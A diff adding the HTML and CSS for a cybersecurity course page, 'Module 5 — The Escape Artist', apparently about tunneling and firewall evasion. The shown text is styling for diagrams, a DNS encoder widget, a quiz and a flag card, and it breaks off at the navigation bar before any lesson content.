@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 5 — The Escape Artist</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500;700&family=Lora:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root{  --bg:#060c09;--bg2:#0a120d;--bg3:#0e1812;--bg4:#132018;--panel:#0c1610;  --e:#10b981;--e2:#059669;--ed:rgba(16,185,129,0.12);--eg:rgba(16,185,129,0.06);  --e-bright:#34d399;--e-dim:#065f46;  --amber:#f59e0b;--amber-dim:rgba(245,158,11,0.1);  --blue:#60a5fa;--blue-dim:rgba(96,165,250,0.1);  --red:#f87171;--red-dim:rgba(248,113,113,0.1);  --purple:#a78bfa;--purple-dim:rgba(167,139,250,0.1);  --text:#d1fae5;--text-dim:#6b9e82;--text-faint:#1e4030;  --be:rgba(16,185,129,0.18);--be2:rgba(16,185,129,0.07);  --radius:6px;  --font-head:'Syne',sans-serif;--font-mono:'JetBrains Mono',monospace;--font-body:'Lora',serif;}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-body);font-size:17px;line-height:1.8;overflow-x:hidden;}
+    body::before{content:'';position:fixed;inset:0;z-index:999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.025) 2px,rgba(0,0,0,0.025) 4px);}
+    nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 2.5rem;height:56px;background:rgba(6,12,9,0.94);backdrop-filter:blur(14px);border-bottom:1px solid var(--be2);}
+    .nav-logo{font-family:var(--font-mono);font-size:12px;color:var(--e);letter-spacing:0.12em;text-transform:uppercase;}
+    .nav-back{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);letter-spacing:0.08em;text-decoration:none;transition:color 0.2s;}
+    .nav-back:hover{color:var(--e);}
+    .nav-bar{width:180px;height:3px;background:var(--bg4);border-radius:2px;overflow:hidden;}
+    .nav-bar-fill{height:100%;background:linear-gradient(90deg,var(--e),var(--e-bright));border-radius:2px;transition:width 0.6s ease;box-shadow:0 0 8px var(--e);width:0%;}
+    .nav-pct{font-family:var(--font-mono);font-size:11px;color:var(--e);}
+    /* HERO */
+    .hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:80px 2.5rem 4rem;position:relative;overflow:hidden;}
+    .hero-bg{position:absolute;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 60% 50% at 50% 40%,rgba(16,185,129,0.05) 0%,transparent 70%);}
+    .hero-pipes{position:absolute;inset:0;z-index:0;pointer-events:none;}
+    .hero-corner{position:absolute;font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.1em;}
+    .hero-corner.tl{top:72px;left:2.5rem;}
+    .hero-corner.tr{top:72px;right:2.5rem;text-align:right;}
+    .hero-corner.bl{bottom:2rem;left:2.5rem;}
+    .hero-corner.br{bottom:2rem;right:2.5rem;text-align:right;}
+    .hero-inner{position:relative;z-index:1;max-width:880px;margin:0 auto;}
+    .hero-tag{display:inline-flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:11px;color:var(--e);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:2rem;}
+    .hero-tag::before{content:'';display:block;width:24px;height:1px;background:var(--e);box-shadow:0 0 6px var(--e);}
+    .hero h1{font-family:var(--font-head);font-size:clamp(2.8rem,7vw,5.2rem);font-weight:800;line-height:1.0;letter-spacing:-0.02em;color:#fff;margin-bottom:0.4rem;}
+    .hero h1 em{font-style:normal;color:var(--e);text-shadow:0 0 40px rgba(16,185,129,0.5);}
+    .hero-sub{font-family:var(--font-mono);font-size:12px;color:var(--text-dim);letter-spacing:0.06em;margin-bottom:2.5rem;}
+    /* THREE VOICES */
+    .voices-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin-bottom:2.5rem;}
+    .voice-card{background:var(--panel);padding:1.6rem;}
+    .voice-icon{font-size:28px;margin-bottom:0.8rem;}
+    .voice-role{font-family:var(--font-mono);font-size:9px;letter-spacing:0.18em;text-transform:uppercase;margin-bottom:0.4rem;}
+    .voice-card.spy .voice-role{color:var(--e);}
+    .voice-card.whistle .voice-role{color:var(--amber);}
+    .voice-card.redteam .voice-role{color:var(--red);}
+    .voice-name{font-family:var(--font-head);font-size:16px;font-weight:700;color:#fff;margin-bottom:0.6rem;}
+    .voice-card p{font-size:14px;color:var(--text-dim);line-height:1.7;margin:0;}
+    .voice-card p em{font-style:italic;}
+    .voice-card.spy{border-left:3px solid var(--e);}
+    .voice-card.whistle{border-left:3px solid var(--amber);}
+    .voice-card.redteam{border-left:3px solid var(--red);}
+    .hero-objectives{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin-bottom:3rem;}
+    .hero-obj-item{background:var(--panel);padding:1.2rem 1.4rem;display:flex;gap:12px;align-items:flex-start;}
+    .hero-obj-icon{font-family:var(--font-mono);font-size:11px;color:var(--e);background:var(--ed);border:1px solid var(--be);border-radius:3px;padding:2px 6px;white-space:nowrap;margin-top:3px;flex-shrink:0;}
+    .hero-obj-text{font-size:14px;color:var(--text);line-height:1.5;font-family:var(--font-body);}
+    .btn-start{display:inline-flex;align-items:center;gap:10px;background:var(--e);color:#000;font-family:var(--font-mono);font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;padding:14px 28px;border-radius:var(--radius);border:none;cursor:pointer;text-decoration:none;transition:all 0.2s;box-shadow:0 0 24px rgba(16,185,129,0.3);}
+    .btn-start:hover{background:#fff;color:#000;transform:translateY(-1px);}
+    .section{max-width:900px;margin:0 auto;padding:5rem 2.5rem;}
+    .section-divider{border:none;border-top:1px solid var(--be2);margin:0 2.5rem;}
+    .section-tag{font-family:var(--font-mono);font-size:10px;color:var(--e);letter-spacing:0.18em;text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:8px;}
+    .section-tag::before{content:'//';opacity:0.5;}
+    .section-num{color:var(--text-faint);}
+    .section h2{font-family:var(--font-head);font-size:clamp(1.8rem,4vw,2.8rem);font-weight:700;color:#fff;line-height:1.15;margin-bottom:1.2rem;letter-spacing:-0.01em;}
+    .section h2 em{font-style:normal;color:var(--e);}
+    .explainer p{font-size:16.5px;color:var(--text-dim);line-height:1.9;margin-bottom:1.1rem;}
+    .explainer p strong{color:var(--text);}
+    .explainer p em{color:var(--e);font-style:italic;}
+    .explainer p code{font-family:var(--font-mono);font-size:13px;background:var(--bg3);border:1px solid var(--be2);padding:1px 6px;border-radius:3px;color:var(--amber);}
+    .voice-intro{background:var(--bg2);border:1px solid var(--be2);border-radius:var(--radius);padding:1.4rem 1.6rem;margin:1.8rem 0;}
+    .vi-label{font-family:var(--font-mono);font-size:10px;letter-spacing:0.18em;text-transform:uppercase;margin-bottom:0.6rem;}
+    .vi-spy{border-left:3px solid var(--e);}
+    .vi-spy .vi-label{color:var(--e);}
+    .vi-whistle{border-left:3px solid var(--amber);}
+    .vi-whistle .vi-label{color:var(--amber);}
+    .vi-redteam{border-left:3px solid var(--red);}
+    .vi-redteam .vi-label{color:var(--red);}
+    .vi-arch{border-left:3px solid var(--purple);}
+    .vi-arch .vi-label{color:var(--purple);}
+    .voice-intro p{font-size:15px;color:var(--text-dim);margin:0;line-height:1.8;font-style:italic;}
+    .voice-intro p strong{color:var(--text);font-style:normal;}
+    .callout{border-left:3px solid var(--e);background:var(--eg);padding:1.2rem 1.5rem;border-radius:0 var(--radius) var(--radius) 0;margin:2rem 0;}
+    .callout-head{font-family:var(--font-mono);font-size:10px;color:var(--e);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:0.5rem;}
+    .callout p{margin:0;font-size:15px;color:var(--text);line-height:1.75;}
+    .callout p code{font-family:var(--font-mono);font-size:13px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--amber);}
+    .callout.amber{border-left-color:var(--amber);background:var(--amber-dim);}
+    .callout.amber .callout-head{color:var(--amber);}
+    .callout.blue{border-left-color:var(--blue);background:var(--blue-dim);}
+    .callout.blue .callout-head{color:var(--blue);}
+    .callout.purple{border-left-color:var(--purple);background:var(--purple-dim);}
+    .callout.purple .callout-head{color:var(--purple);}
+    /* SSH TUNNEL DIAGRAM */
+    .tunnel-diagram{margin:2rem 0;background:var(--bg2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;}
+    .tunnel-header{background:var(--bg3);padding:0.9rem 1.4rem;border-bottom:1px solid var(--be2);font-family:var(--font-mono);font-size:11px;color:var(--e);letter-spacing:0.12em;text-transform:uppercase;}
+    .tunnel-body{padding:1.5rem;}
+    .tunnel-row{display:flex;align-items:center;gap:0;margin-bottom:1.2rem;position:relative;}
+    .tunnel-node{background:var(--bg4);border:1px solid var(--be2);border-radius:var(--radius);padding:0.8rem 1rem;text-align:center;min-width:110px;flex-shrink:0;}
+    .tunnel-node.active{border-color:var(--e);box-shadow:0 0 12px rgba(16,185,129,0.2);}
+    .tunnel-node-icon{font-size:20px;margin-bottom:4px;}
+    .tunnel-node-name{font-family:var(--font-mono);font-size:11px;color:var(--e);font-weight:700;}
+    .tunnel-node-sub{font-family:var(--font-mono);font-size:9px;color:var(--text-faint);margin-top:2px;}
+    .tunnel-pipe{flex:1;position:relative;height:40px;display:flex;align-items:center;margin:0 4px;}
+    .tunnel-pipe-line{width:100%;height:3px;border-radius:2px;position:relative;overflow:hidden;}
+    .tunnel-pipe-line.blocked{background:rgba(248,113,113,0.3);background-image:repeating-linear-gradient(90deg,rgba(248,113,113,0.5) 0,rgba(248,113,113,0.5) 8px,transparent 8px,transparent 16px);}
+    .tunnel-pipe-line.open{background:rgba(16,185,129,0.3);}
+    .tunnel-pipe-line.encrypted{background:linear-gradient(90deg,var(--e),var(--e-bright));box-shadow:0 0 8px rgba(16,185,129,0.4);}
+    .tunnel-pipe-label{position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-family:var(--font-mono);font-size:9px;white-space:nowrap;letter-spacing:0.08em;}
+    .tunnel-pipe-label.blocked{color:var(--red);}
+    .tunnel-pipe-label.open{color:var(--e);}
+    .tunnel-fw{background:rgba(248,113,113,0.08);border:1px solid rgba(248,113,113,0.25);border-radius:3px;padding:4px 10px;font-family:var(--font-mono);font-size:10px;color:var(--red);letter-spacing:0.08em;text-align:center;white-space:nowrap;flex-shrink:0;}
+    /* PORT TABLE */
+    .port-table{margin:1.5rem 0;border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;}
+    .port-table table{width:100%;border-collapse:collapse;}
+    .port-table th{background:var(--bg3);font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.12em;text-transform:uppercase;padding:0.6rem 1rem;text-align:left;border-bottom:1px solid var(--be2);}
+    .port-table td{font-family:var(--font-mono);font-size:12px;padding:0.6rem 1rem;border-bottom:1px solid rgba(255,255,255,0.03);color:var(--text-dim);}
+    .port-table tr:last-child td{border-bottom:none;}
+    .port-table tr.open td{background:rgba(16,185,129,0.04);}
+    .port-table tr.open td:first-child{color:var(--e);}
+    .port-table tr.blocked td:first-child{color:var(--red);}
+    .port-status{display:inline-block;padding:1px 8px;border-radius:2px;font-size:10px;font-weight:700;}
+    .port-status.open{background:rgba(16,185,129,0.15);color:var(--e);}
+    .port-status.blocked{background:var(--red-dim);color:var(--red);}
+    /* VPN COMPARE */
+    .vpn-compare{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .vpn-col{background:var(--panel);padding:0;}
+    .vpn-head{padding:1rem 1.4rem;border-bottom:1px solid var(--be2);}
+    .vpn-head h4{font-family:var(--font-head);font-size:16px;font-weight:700;color:#fff;margin-bottom:2px;}
+    .vpn-head span{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);}
+    .vpn-body{padding:1.2rem 1.4rem;}
+    .vpn-point{display:flex;gap:10px;margin-bottom:0.8rem;font-size:14px;color:var(--text-dim);line-height:1.6;}
+    .vpn-point .ico{flex-shrink:0;font-size:13px;margin-top:2px;}
+    .vpn-point strong{color:var(--text);}
+    /* ZERO TRUST COMPARE */
+    .zt-compare{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .zt-col{background:var(--panel);padding:1.6rem;}
+    .zt-col h4{font-family:var(--font-head);font-size:16px;font-weight:700;margin-bottom:1rem;}
+    .zt-col.old h4{color:var(--red);}
+    .zt-col.new h4{color:var(--e);}
+    .zt-point{display:flex;gap:10px;margin-bottom:0.8rem;font-size:14px;color:var(--text-dim);line-height:1.6;}
+    .zt-point .ico{flex-shrink:0;}
+    .zt-point strong{color:var(--text);}
+    /* CONCEPT CARDS */
+    .concept-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .concept-card{background:var(--panel);padding:1.6rem;}
+    .concept-card h4{font-family:var(--font-head);font-size:16px;font-weight:600;color:#fff;margin-bottom:0.3rem;}
+    .concept-card .fullform{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.06em;margin-bottom:0.8rem;display:block;}
+    .concept-card p{font-size:14.5px;color:var(--text-dim);line-height:1.75;margin:0;}
+    .concept-card p strong{color:var(--text);}
+    .concept-card p code{font-family:var(--font-mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--amber);}
+    .tag{display:inline-block;font-family:var(--font-mono);font-size:9px;letter-spacing:0.12em;text-transform:uppercase;padding:3px 8px;border-radius:3px;margin-bottom:0.8rem;}
+    .tag-e{background:var(--ed);border:1px solid var(--be);color:var(--e);}
+    .tag-amber{background:var(--amber-dim);border:1px solid rgba(245,158,11,0.3);color:var(--amber);}
+    .tag-blue{background:var(--blue-dim);border:1px solid rgba(96,165,250,0.2);color:var(--blue);}
+    .tag-purple{background:var(--purple-dim);border:1px solid rgba(167,139,250,0.25);color:var(--purple);}
+    /* TERMINAL */
+    .terminal{background:#030806;border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:1.5rem 0;font-family:var(--font-mono);}
+    .terminal-bar{background:var(--bg3);padding:0.6rem 1rem;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--be2);}
+    .dot{width:10px;height:10px;border-radius:50%;}
+    .dot.r{background:#ff5f57;}
+    .dot.y{background:#febc2e;}
+    .dot.g{background:#28c840;}
+    .terminal-label{font-size:10px;color:var(--text-faint);letter-spacing:0.1em;margin-left:auto;}
+    .terminal-body{padding:1.2rem 1.5rem;}
+    .term-line{font-size:13px;line-height:2;display:flex;gap:0.5rem;align-items:baseline;}
+    .term-prompt{color:var(--e);}
+    .term-cmd{color:#fff;}
+    .term-out{color:var(--text-dim);margin-left:1.5rem;display:block;line-height:1.7;}
+    .term-out.hi{color:var(--amber);}
+    .term-out.ok{color:var(--e);}
+    .term-out.bad{color:var(--red);}
+    .term-out.faint{color:var(--text-faint);}
+    .term-out.blue{color:var(--blue);}
+    .term-cursor{display:inline-block;width:8px;height:14px;background:var(--e);animation:blink 1s step-end infinite;vertical-align:middle;margin-left:2px;}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+    /* LAB */
+    .lab-wrap{border:1px solid var(--be);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .lab-header{background:var(--bg2);padding:1.2rem 1.5rem;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--be2);}
+    .lab-badge{background:var(--e);color:#000;font-family:var(--font-mono);font-size:9px;font-weight:700;letter-spacing:0.15em;padding:4px 10px;border-radius:3px;}
+    .lab-title{font-family:var(--font-head);font-size:18px;font-weight:700;color:#fff;}
+    .lab-tabs{display:flex;background:var(--bg3);border-bottom:1px solid var(--be2);}
+    .lab-tab{flex:1;padding:0.85rem;font-family:var(--font-mono);font-size:11px;letter-spacing:0.08em;text-align:center;cursor:pointer;border:none;background:transparent;color:var(--text-dim);border-bottom:2px solid transparent;transition:all 0.2s;text-transform:uppercase;}
+    .lab-tab.active{color:var(--e);border-bottom-color:var(--e);background:var(--ed);}
+    .lab-tab:hover:not(.active){color:var(--text);background:var(--bg4);}
+    .lab-body{padding:1.8rem;}
+    /* FIREWALL VISUALISER */
+    .fw-vis{background:var(--bg3);border:1px solid var(--be2);border-radius:var(--radius);padding:1.5rem;margin:1rem 0;position:relative;min-height:180px;}
+    .fw-vis-grid{display:flex;align-items:center;gap:0;justify-content:space-between;}
+    .fw-box{background:var(--bg4);border:1px solid var(--be2);border-radius:var(--radius);padding:1rem;text-align:center;min-width:110px;flex-shrink:0;}
+    .fw-box-icon{font-size:24px;margin-bottom:6px;}
+    .fw-box-name{font-family:var(--font-mono);font-size:11px;color:var(--e);font-weight:700;}
+    .fw-box-sub{font-family:var(--font-mono);font-size:9px;color:var(--text-faint);margin-top:2px;}
+    .fw-wall{background:rgba(248,113,113,0.08);border:2px solid rgba(248,113,113,0.3);border-radius:var(--radius);padding:0.8rem 0.5rem;text-align:center;flex-shrink:0;width:80px;}
+    .fw-wall-label{font-family:var(--font-mono);font-size:10px;color:var(--red);letter-spacing:0.1em;writing-mode:vertical-rl;text-orientation:mixed;margin:0 auto;}
+    .fw-pipe-wrap{flex:1;display:flex;flex-direction:column;gap:4px;padding:0 8px;position:relative;}
+    .fw-port-row{display:flex;align-items:center;gap:6px;padding:4px 8px;border-radius:3px;font-family:var(--font-mono);font-size:11px;cursor:pointer;transition:all 0.2s;}
+    .fw-port-row.blocked{background:rgba(248,113,113,0.06);border:1px solid rgba(248,113,113,0.15);}
+    .fw-port-row.allowed{background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.15);}
+    .fw-port-row.tunneled{background:rgba(16,185,129,0.12);border:1px solid var(--be);box-shadow:0 0 8px rgba(16,185,129,0.1);}
+    .fw-port-num{width:50px;font-weight:700;}
+    .fw-port-row.blocked .fw-port-num{color:var(--red);}
+    .fw-port-row.allowed .fw-port-num{color:var(--e);}
+    .fw-port-row.tunneled .fw-port-num{color:var(--e-bright);}
+    .fw-port-name{flex:1;color:var(--text-dim);}
+    .fw-port-status{font-size:10px;padding:1px 6px;border-radius:2px;}
+    .fw-port-row.blocked .fw-port-status{background:var(--red-dim);color:var(--red);}
+    .fw-port-row.allowed .fw-port-status{background:var(--ed);color:var(--e);}
+    .fw-port-row.tunneled .fw-port-status{background:var(--ed);color:var(--e-bright);}
+    /* TUNNEL VISUALISER CANVAS */
+    .tvis-wrap{background:var(--bg3);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:1rem 0;}
+    .tvis-canvas{width:100%;height:200px;display:block;}
+    .tvis-legend{display:flex;gap:1.5rem;padding:0.7rem 1.2rem;background:var(--bg4);border-top:1px solid var(--be2);flex-wrap:wrap;}
+    .tvis-legend-item{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);display:flex;align-items:center;gap:6px;}
+    .tvis-dot{width:10px;height:10px;border-radius:50%;}
+    /* DNS ENCODER */
+    .dns-encoder{background:var(--bg3);border:1px solid var(--be2);border-radius:var(--radius);padding:1.4rem;margin:1rem 0;}
+    .dns-encoder-label{font-family:var(--font-mono);font-size:10px;color:var(--amber);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:1rem;}
+    .dns-encode-row{display:flex;gap:8px;align-items:center;margin-bottom:0.8rem;flex-wrap:wrap;}
+    .dns-input{background:var(--bg);border:1px solid var(--be2);border-radius:3px;padding:7px 12px;font-family:var(--font-mono);font-size:13px;color:var(--e);outline:none;flex:1;min-width:200px;}
+    .dns-input:focus{border-color:var(--be);box-shadow:0 0 0 2px var(--eg);}
+    .dns-input::placeholder{color:var(--text-faint);}
+    .btn-encode{background:var(--ed);border:1px solid var(--be);color:var(--e);font-family:var(--font-mono);font-size:12px;padding:8px 18px;border-radius:3px;cursor:pointer;letter-spacing:0.08em;transition:all 0.15s;white-space:nowrap;}
+    .btn-encode:hover{background:var(--e);color:#000;}
+    .dns-query-display{background:var(--bg);border:1px solid var(--be2);border-radius:3px;padding:0.8rem 1rem;font-family:var(--font-mono);font-size:12px;color:var(--text-dim);margin-top:0.8rem;min-height:40px;line-height:1.7;word-break:break-all;}
+    .dns-query-display .q-label{color:var(--amber);}
+    .dns-query-display .q-data{color:var(--e-bright);}
+    .dns-ids-log{background:#020604;border:1px solid var(--be2);border-radius:3px;padding:0.8rem 1rem;font-family:var(--font-mono);font-size:11px;margin-top:0.6rem;line-height:1.8;}
+    /* CMD CHIPS */
+    .cmd-palette{display:flex;flex-direction:column;gap:8px;margin-bottom:1.2rem;}
+    .cmd-chip{display:flex;align-items:flex-start;gap:10px;background:var(--bg3);border:1px solid var(--be2);border-radius:var(--radius);padding:0.8rem 1rem;cursor:pointer;transition:all 0.2s;font-family:var(--font-mono);font-size:12px;color:var(--text-dim);}
+    .cmd-chip:hover:not(.used){border-color:var(--be);color:var(--e);background:var(--ed);}
+    .cmd-chip.used{opacity:0.4;pointer-events:none;}
+    .cmd-code{color:var(--amber);flex:1;line-height:1.5;}
+    .cmd-desc{font-size:10px;color:var(--text-faint);letter-spacing:0.06em;flex-shrink:0;margin-top:1px;}
+    @keyframes slideIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+    .mission-complete{animation:slideIn 0.4s ease forwards;border:1px solid var(--e);background:var(--eg);border-radius:var(--radius);padding:1.3rem 1.5rem;margin-top:1rem;}
+    .mc-head{font-family:var(--font-mono);font-size:11px;color:var(--e);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:0.5rem;}
+    .mission-complete p{font-size:15px;color:var(--text);line-height:1.8;margin:0;}
+    .mission-complete code{font-family:var(--font-mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--e);}
+    /* QUIZ */
+    .quiz-wrap{border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .quiz-header{background:var(--bg2);padding:1rem 1.5rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--be2);}
+    .quiz-header h4{font-family:var(--font-head);font-size:16px;font-weight:600;color:#fff;}
+    .quiz-score{font-family:var(--font-mono);font-size:12px;color:var(--text-faint);}
+    .quiz-q{padding:1.4rem 1.5rem;border-bottom:1px solid rgba(255,255,255,0.04);}
+    .quiz-q:last-child{border-bottom:none;}
+    .quiz-q-text{font-size:15.5px;color:var(--text);margin-bottom:1rem;font-family:var(--font-body);line-height:1.7;}
+    .quiz-options{display:flex;flex-direction:column;gap:8px;}
+    .quiz-option{display:flex;align-items:center;gap:10px;padding:10px 14px;border:1px solid rgba(255,255,255,0.06);border-radius:var(--radius);cursor:pointer;transition:all 0.15s;font-family:var(--font-mono);font-size:13px;color:var(--text-dim);}
+    .quiz-option:hover{border-color:var(--be);color:var(--text);background:var(--ed);}
+    .quiz-option.correct{border-color:var(--e);background:var(--ed);color:var(--e);}
+    .quiz-option.wrong{border-color:var(--red);background:var(--red-dim);color:var(--red);}
+    .quiz-opt-key{width:22px;height:22px;border-radius:3px;background:var(--bg4);border:1px solid rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-faint);flex-shrink:0;}
+    .quiz-option.correct .quiz-opt-key{background:var(--e);border-color:var(--e);color:#000;}
+    .quiz-option.wrong .quiz-opt-key{background:var(--red);border-color:var(--red);color:#fff;}
+    .quiz-explain{margin-top:10px;padding:12px 16px;background:var(--bg2);border-radius:var(--radius);font-size:14px;color:var(--text-dim);font-family:var(--font-body);display:none;border-left:3px solid var(--e);line-height:1.7;}
+    .quiz-explain.show{display:block;}
+    /* FINAL COMPLETION */
+    .completion{text-align:center;padding:5rem 2.5rem;max-width:800px;margin:0 auto;display:none;flex-direction:column;align-items:center;opacity:0;transition:opacity 1.2s ease;}
+    .completion.visible{opacity:1;}
+    .series-badge{margin:0 auto 2rem;position:relative;width:120px;height:120px;}
+    .series-badge-ring{width:120px;height:120px;border-radius:50%;border:2px solid var(--e);display:flex;align-items:center;justify-content:center;font-size:48px;background:radial-gradient(circle,rgba(16,185,129,0.15),transparent);box-shadow:0 0 50px rgba(16,185,129,0.3),0 0 100px rgba(16,185,129,0.1);}
+    .completion h2{font-family:var(--font-head);font-size:clamp(2rem,5vw,3.5rem);font-weight:800;color:#fff;margin-bottom:0.5rem;letter-spacing:-0.02em;}
+    .completion h2 em{font-style:normal;color:var(--e);}
+    .completion-subtitle{font-family:var(--font-mono);font-size:12px;color:var(--text-dim);letter-spacing:0.1em;margin-bottom:1.5rem;text-transform:uppercase;}
+    .completion p{color:var(--text-dim);margin-bottom:2rem;font-size:16px;line-height:1.8;max-width:600px;}
+    .series-modules{display:grid;grid-template-columns:repeat(5,1fr);gap:1px;background:var(--be2);border:1px solid var(--be2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;width:100%;}
+    .series-mod{background:var(--panel);padding:1rem;text-align:center;}
+    .series-mod-num{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.1em;margin-bottom:4px;}
+    .series-mod-name{font-family:var(--font-head);font-size:12px;font-weight:600;color:var(--e);}
+    .series-mod-icon{font-size:20px;margin-bottom:6px;}
+    .completion-stats{display:flex;justify-content:center;gap:2.5rem;margin:1.5rem 0;flex-wrap:wrap;}
+    .stat-val{font-family:var(--font-mono);font-size:28px;font-weight:700;color:var(--e);display:block;}
+    .stat-label{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.12em;text-transform:uppercase;}
+    .btn-cert{display:inline-flex;align-items:center;gap:10px;background:var(--e);color:#000;font-family:var(--font-mono);font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;padding:16px 32px;border-radius:var(--radius);border:none;cursor:pointer;text-decoration:none;transition:all 0.2s;box-shadow:0 0 24px rgba(16,185,129,0.3);}
+    .btn-cert:hover{background:#fff;transform:translateY(-2px);box-shadow:0 0 40px rgba(16,185,129,0.5);}
+    @media(max-width:640px){  
+      .voices-grid,.concept-grid,.vpn-compare,.zt-compare{grid-template-columns:1fr;}  
+      .series-modules{grid-template-columns:1fr 1fr;}
+    }
+
+    /* FUTURISTIC GLASSMORPHIC KEY CARD */
+    .futuristic-flag-card {
+      background: rgba(13, 25, 34, 0.45);
+      backdrop-filter: blur(12px) saturate(180%);
+      -webkit-backdrop-filter: blur(12px) saturate(180%);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      border-radius: 10px;
+      padding: 2rem;
+      margin: 2.5rem auto;
+      max-width: 550px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 
+                  0 0 15px rgba(16, 185, 129, 0.05),
+                  inset 0 0 15px rgba(16, 185, 129, 0.05);
+      animation: pulseGlow 4s infinite alternate;
+    }
+
+    .futuristic-flag-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(16, 185, 129, 0.02),
+          rgba(16, 185, 129, 0.1),
+          rgba(16, 185, 129, 0.02),
+          transparent
+      );
+      transform: skewX(-15deg);
+      animation: scanLine 6s infinite linear;
+      pointer-events: none;
+    }
+
+    @keyframes scanLine {
+      0% { left: -150%; }
+      100% { left: 150%; }
+    }
+
+    @keyframes pulseGlow {
+      0% { border-color: rgba(16, 185, 129, 0.15); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 0 0 15px rgba(16, 185, 129, 0.05); }
+      100% { border-color: rgba(16, 185, 129, 0.4); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 0 0 25px rgba(16, 185, 129, 0.15); }
+    }
+
+    .flag-value {
+      font-family: var(--font-mono);
+      font-size: clamp(12px, 2.2vw, 15px);
+      color: var(--e-bright);
+      text-shadow: 0 0 10px rgba(16, 185, 129, 0.4);
+      background: rgba(4, 8, 11, 0.7);
+      border: 1px solid rgba(16, 185, 129, 0.15);
+      padding: 12px 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 1rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      letter-spacing: 0.05em;
+      position: relative;
+      z-index: 2;
+      word-break: break-all;
+      user-select: all;
+    }
+
+    .flag-value:hover {
+      background: rgba(16, 185, 129, 0.08);
+      border-color: rgba(16, 185, 129, 0.5);
+      transform: scale(1.02);
+      box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);
+    }
+
+    .flag-badge {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      letter-spacing: 0.2em;
+      color: var(--amber);
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <nav>  
+    <div style="display:flex;align-items:center;gap:1.5rem">    
+      <span class="nav-logo">CyberNet — Module 05</span>  
+    </div>  
+    <div style="display:flex;align-items:center;gap:10px">    
+      <div class="nav-bar"><div class="nav-bar-fill" id="navFill"></div></div>    
+      <span class="nav-pct" id="navPct">0%</span>  
